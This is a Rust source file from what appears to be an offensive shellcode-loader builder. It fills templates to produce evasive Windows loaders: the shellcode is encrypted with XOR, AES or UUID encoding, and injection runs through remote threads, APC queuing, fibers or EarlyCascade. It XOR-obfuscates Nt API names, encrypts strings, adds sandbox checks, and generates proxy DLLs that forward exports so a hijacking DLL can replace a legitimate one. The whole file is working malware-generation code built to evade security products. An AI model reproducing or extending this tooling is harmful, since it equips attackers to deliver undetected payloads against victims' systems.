use crate::aes::encrypt_aes;
use crate::arg_parser::{Encryption, Execution, Format, Order};
use crate::dll_proxy;
use crate::pe_parser;
use crate::sandbox::build_sandbox;
use crate::tools::{
    litcrypt_string_expr, random_aes_iv, random_aes_key, random_u8, EncryptionOutput,
};
use crate::uuid_enc::encrypt_uuid;
use crate::xor::encrypt_xor;
use fs_extra::dir::{copy, CopyOptions};
use std::collections::HashMap;
use std::fs::{self, OpenOptions};
use std::io::prelude::*;
use std::path::{Path, PathBuf};
use std::process::exit;
use std::time::{SystemTime, UNIX_EPOCH};

/// Obfuscate API function name using XOR with a key
/// 
/// # Arguments
/// * `name` - The API function name to obfuscate
/// * `key` - The XOR key to use
/// 
/// # Returns
/// Obfuscated string representation of the API name
fn obfuscate_api_name(name: &str, key: u8) -> String {
    let bytes: Vec<String> = name.bytes().map(|b| format!("0x{:02x}", b ^ key)).collect();
    format!("[{}]", bytes.join(", "))
}

/// Generate a non-zero random key for API obfuscation
fn non_zero_random_key() -> u8 {
    loop {
        let k = random_u8();
        if k != 0 {
            return k;
        }
    }
}

const OUTPUT_DIR: &str = "shared";
const LITCRYPT_DEPENDENCY: &str = r#"litcrypt = "0.4""#;
const LITCRYPT_SETUP: &str = "#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();";

/// Build the dependencies string for Cargo.toml
/// 
/// # Arguments
/// * `template_dependencies` - Optional additional dependencies from the encryption method
/// 
/// # Returns
/// Complete dependencies string
fn build_dependencies(template_dependencies: Option<String>) -> String {
    match template_dependencies {
        Some(dependencies) if !dependencies.trim().is_empty() => {
            format!("{}\n{}", LITCRYPT_DEPENDENCY, dependencies)
        }
        _ => LITCRYPT_DEPENDENCY.to_string(),
    }
}

/// Search and replace text in a file
/// 
/// # Arguments
/// * `path_to_file` - Path to the file to modify
/// * `search` - Text to search for
/// * `replace` - Text to replace with
/// 
/// # Returns
/// Result indicating success or failure
fn search_and_replace(
    path_to_file: &Path,
    search: &str,
    replace: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let file_content = fs::read_to_string(path_to_file)?;
    let new_content = file_content.replace(search, replace);

    let mut file = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(path_to_file)?;
    file.write_all(new_content.as_bytes())?;

    Ok(())
}

/// Create a timestamped output folder
/// 
/// # Arguments
/// * `parent` - Parent directory
/// 
/// # Returns
/// Path to the created output folder
fn create_root_folder(parent: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
    let folder_name = format!("output_{}", timestamp);
    println!("[+] Creating output folder: {}", folder_name);

    let result_path = parent.join(folder_name);
    fs::create_dir(&result_path)?;

    Ok(result_path)
}

/// Copy a template directory to the output location
/// 
/// # Arguments
/// * `source` - Source template directory
/// * `dest` - Destination directory
/// 
/// # Returns
/// Result indicating success or failure
fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let options = CopyOptions {
        content_only: true,
        ..Default::default()
    };
    copy(source, dest, &options)?;

    Ok(())
}

/// Get the template path for a given execution method
/// 
/// # Arguments
/// * `execution` - The execution method
/// 
/// # Returns
/// Path to the template directory
fn template_path_for_execution(execution: &Execution) -> &'static Path {
    match execution {
        Execution::NtQueueUserAPC => Path::new("templates/ntAPC/."),
        Execution::NtCreateRemoteThread => Path::new("templates/ntCRT/."),
        Execution::SysCreateRemoteThread => Path::new("templates/sysCRT/."),
        Execution::WinCreateRemoteThread => Path::new("templates/winCRT/."),
        Execution::WinFiber => Path::new("templates/winFIBER/."),
        Execution::NtFiber => Path::new("templates/ntFIBER/."),
        Execution::SysFiber => Path::new("templates/sysFIBER/."),
        Execution::EarlyCascade => Path::new("templates/ntEarlyCascade/."),
    }
}

/// Get the encrypted filename based on encryption method
/// 
/// # Arguments
/// * `encryption` - The encryption method
/// 
/// # Returns
/// Filename for the encrypted shellcode
fn encrypted_filename(encryption: &Encryption) -> &'static str {
    match encryption {
        Encryption::Xor => "input.xor",
        Encryption::Aes => "input.aes",
        Encryption::Uuid => "input.uuid",
    }
}

/// Build the encrypted shellcode output
/// 
/// # Arguments
/// * `order` - The configuration order
/// * `src_dir` - Source directory for the output
/// 
/// # Returns
/// Tuple of (EncryptionOutput, include_path)
fn build_encrypted_output(order: &Order, src_dir: &Path) -> (EncryptionOutput, String) {
    let filename = encrypted_filename(&order.encryption);
    let path = src_dir.join(filename);
    let include_path = format!("\"{}\"", filename);

    let output = match order.encryption {
        Encryption::Xor => encrypt_xor(&order.shellcode_path, &path, non_zero_random_key()),
        Encryption::Aes => encrypt_aes(
            &order.shellcode_path,
            &path,
            &random_aes_key(),
            &random_aes_iv(),
        ),
        Encryption::Uuid => encrypt_uuid(&order.shellcode_path, &path),
    };

    (output, include_path)
}

/// Build all replacements for the template
/// 
/// # Arguments
/// * `order` - The configuration order
/// * `src_dir` - Source directory for the output
/// 
/// # Returns
/// HashMap of replacements to apply to the template
fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, String> {
    let (enc_output, include_path) = build_encrypted_output(order, src_dir);
    let dependencies = build_dependencies(enc_output.dependencies);

    let mut replacements: HashMap<&'static str, String> = HashMap::new();
    replacements.insert("{{PATH_TO_SHELLCODE}}", include_path);
    replacements.insert("{{DECRYPTION_FUNCTION}}", enc_output.decryption_function);
    replacements.insert("{{MAIN}}", enc_output.main);
    replacements.insert("{{DEPENDENCIES}}", dependencies);
    replacements.insert("{{IMPORTS}}", enc_output.imports.unwrap_or_default());
    replacements.insert("{{LITCRYPT_SETUP}}", LITCRYPT_SETUP.to_string());
    replacements.insert("{{DLL_MAIN}}", String::new());
    replacements.insert("{{DLL_FORMAT}}", String::new());
    replacements.insert(
        "{{TARGET_PROCESS}}",
        litcrypt_string_expr(&order.target_process),
    );
    replacements.insert("{{SANDBOX}}", String::new());
    replacements.insert("{{SANDBOX_IMPORTS}}", String::new());

    if let Some(ref domain) = order.sandbox {
        let sandbox_output = build_sandbox(domain);
        replacements.insert("{{SANDBOX}}", sandbox_output.sandbox_function);
        replacements.insert("{{SANDBOX_IMPORTS}}", sandbox_output.sandbox_import);
    }

    let api_key = non_zero_random_key();
    replacements.insert("{{API_KEY}}", format!("0x{:02x}", api_key));
    replacements.insert(
        "{{OBF_NT_OPEN_PROCESS}}",
        obfuscate_api_name("NtOpenProcess", api_key),
    );
    replacements.insert(
        "{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtAllocateVirtualMemory", api_key),
    );
    replacements.insert(
        "{{OBF_NT_WRITE_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtWriteVirtualMemory", api_key),
    );
    replacements.insert(
        "{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtProtectVirtualMemory", api_key),
    );
    replacements.insert(
        "{{OBF_NT_CREATE_THREAD_EX}}",
        obfuscate_api_name("NtCreateThreadEx", api_key),
    );
    replacements.insert(
        "{{OBF_NT_QUEUE_APC_THREAD}}",
        obfuscate_api_name("NtQueueApcThread", api_key),
    );
    replacements.insert(
        "{{OBF_NT_TEST_ALERT}}",
        obfuscate_api_name("NtTestAlert", api_key),
    );
    replacements.insert(
        "{{OBF_NT_DELAY_EXECUTION}}",
        obfuscate_api_name("NtDelayExecution", api_key),
    );

    replacements
}

/// Apply DLL format to the template
/// 
/// # Arguments
/// * `replacements` - HashMap of replacements to update
/// * `main_rs_path` - Path to the main.rs file
/// * `is_proxy` - Whether this is a proxy DLL
/// 
/// # Returns
/// Path to the target file (lib.rs for DLL, main.rs for EXE)
fn apply_dll_format(
    replacements: &mut HashMap<&'static str, String>,
    main_rs_path: &Path,
    is_proxy: bool,
) -> PathBuf {
    let dll_cargo_conf = r#"
    [lib]
    crate-type = ["cdylib"]"#;
    replacements.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());

    let dll_main_fn = if is_proxy {
        r#"
    const DLL_PROCESS_ATTACH: u32 = 1;
    const DLL_PROCESS_DETACH: u32 = 0;

    #[no_mangle]
    #[allow(non_snake_case, unused_variables, unreachable_patterns)]
    extern "system" fn DllMain(
        dll_module: usize,
        call_reason: u32,
        _: *mut ())
        -> bool
    {
        match call_reason {
            DLL_PROCESS_ATTACH => {
                unsafe { proxy::init(); }
                main();
            }
            DLL_PROCESS_DETACH => (),
            _ => ()
        }

        true
    }
    "#
    } else {
        r#"
    const DLL_PROCESS_ATTACH: u32 = 1;
    const DLL_PROCESS_DETACH: u32 = 0;

    #[no_mangle]
    #[allow(non_snake_case, unused_variables, unreachable_patterns)]
    extern "system" fn DllMain(
        dll_module: usize,
        call_reason: u32,
        _: *mut ())
        -> bool
    {
        match call_reason {
            DLL_PROCESS_ATTACH => (),
            DLL_PROCESS_DETACH => (),
            _ => ()
        }

        true
    }
    #[no_mangle]
    pub extern "C" fn DllRegisterServer() {{
        main()
    }}
    #[no_mangle]
    pub extern "C" fn DllGetClassObject() {{
        main()
    }}
    #[no_mangle]
    pub extern "C" fn DllUnregisterServer() {{
        main()
    }}
    #[no_mangle]
    pub extern "C" fn Run() {{
        main()
    }}
    "#
    };
    replacements.insert("{{DLL_MAIN}}", dll_main_fn.to_string());

    let lib_rs_path = main_rs_path.with_file_name("lib.rs");
    if let Err(e) = fs::rename(main_rs_path, &lib_rs_path) {
        eprintln!("[-] Error while renaming main.rs to lib.rs: {}", e);
        exit(1);
    }

    lib_rs_path
}

/// Apply all replacements to the template files
/// 
/// # Arguments
/// * `replacements` - HashMap of replacements to apply
/// * `main_path` - Path to the main source file
/// * `cargo_path` - Path to the Cargo.toml file
fn apply_replacements(replacements: &HashMap<&str, String>, main_path: &Path, cargo_path: &Path) {
    for (key, value) in replacements {
        search_and_replace(main_path, key, value)
            .unwrap_or_else(|e| eprintln!("Warning: template replace failed for {}: {}", key, e));
        search_and_replace(cargo_path, key, value)
            .unwrap_or_else(|e| eprintln!("Warning: cargo replace failed for {}: {}", key, e));
    }
}

/// Find the position to insert the proxy module
/// 
/// # Arguments
/// * `existing` - Existing file content
/// 
/// # Returns
/// Byte offset where to insert the proxy module
fn proxy_module_insert_offset(existing: &str) -> usize {
    if let Some(pos) = existing.find("use_litcrypt!();") {
        let after_marker = pos + "use_litcrypt!();".len();
        return after_marker
            + existing[after_marker..]
                .find('\n')
                .map(|newline| newline + 1)
                .unwrap_or(0);
    }

    let mut inner_attr_end = 0;
    for line in existing.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("#!") || trimmed.is_empty() {
            inner_attr_end += line.len() + 1;
        } else {
            break;
        }
    }
    inner_attr_end.min(existing.len())
}

/// Apply proxy DLL configuration
/// 
/// # Arguments
/// * `order` - The configuration order
/// * `folder` - Output folder path
fn apply_proxy(order: &Order, folder: &Path) {
    let proxy_path = order.proxy_dll.as_ref().unwrap();
    let exports = pe_parser::parse_exports(proxy_path).unwrap_or_else(|e| {
        eprintln!("[-] Failed to parse proxy DLL exports: {}", e);
        exit(1);
    });

    if exports.is_empty() {
        eprintln!("[-] Warning: proxy DLL has no exports");
    }

    let stem = pe_parser::dll_stem(proxy_path);
    let proxy_output = dll_proxy::generate_proxy(&exports, &stem);

    let src_dir = folder.join("src");
    fs::write(src_dir.join("proxy.rs"), &proxy_output.proxy_source)
        .expect("Failed to write proxy.rs");

    let lib_rs_path = src_dir.join("lib.rs");
    let existing = fs::read_to_string(&lib_rs_path).expect("Failed to read lib.rs");
    let insert_at = proxy_module_insert_offset(&existing);
    let updated = format!(
        "{}\n#[allow(non_upper_case_globals, non_snake_case)]\nmod proxy;\n{}",
        existing[..insert_at].trim_end(),
        &existing[insert_at..]
    );
    fs::write(&lib_rs_path, updated).expect("Failed to update lib.rs with mod proxy");

    println!(
        "[+] DLL proxying: {} exports forwarded. Rename the original DLL to '{}'",
        exports.len(),
        proxy_output.original_dll_name
    );
}

/// Main function to assemble the Rust code for the loader
/// 
/// # Arguments
/// * `order` - The configuration order
/// 
/// # Returns
/// Path to the output folder containing the generated Rust code
pub fn assemble(order: Order) -> PathBuf {
    println!("[+] Assembling Rust code..");

    let template_path = template_path_for_execution(&order.execution);
    let folder = create_root_folder(Path::new(OUTPUT_DIR)).expect("Failed to create output folder");
    copy_template(template_path, &folder).expect("Failed to copy template");

    let src_dir = folder.join("src");
    let main_rs = src_dir.join("main.rs");
    let cargo_toml = folder.join("Cargo.toml");

    let mut replacements = build_replacements(&order, &src_dir);

    let is_proxy = order.proxy_dll.is_some();
    let target_file = match order.format {
        Format::Dll => apply_dll_format(&mut replacements, &main_rs, is_proxy),
        Format::Exe => main_rs,
    };

    apply_replacements(&replacements, &target_file, &cargo_toml);

    if is_proxy {
        apply_proxy(&order, &folder);
    }

    println!("[+] Done assembling Rust code!");
    folder
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_dependencies_always_includes_litcrypt() {
        assert_eq!(build_dependencies(None), r#"litcrypt = "0.4""#);
        assert_eq!(
            build_dependencies(Some(r#"libaes = "0.7""#.to_string())),
            "litcrypt = \"0.4\"\nlibaes = \"0.7\""
        );
    }

    #[test]
    fn test_proxy_module_insert_offset_keeps_litcrypt_first() {
        let source = "#![windows_subsystem = \"windows\"]\n\n#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();\n\nuse std::include_bytes;\n";
        let insert_at = proxy_module_insert_offset(source);
        assert!(source[..insert_at].contains("use_litcrypt!();"));
        assert!(source[insert_at..].starts_with('\n'));
    }
}
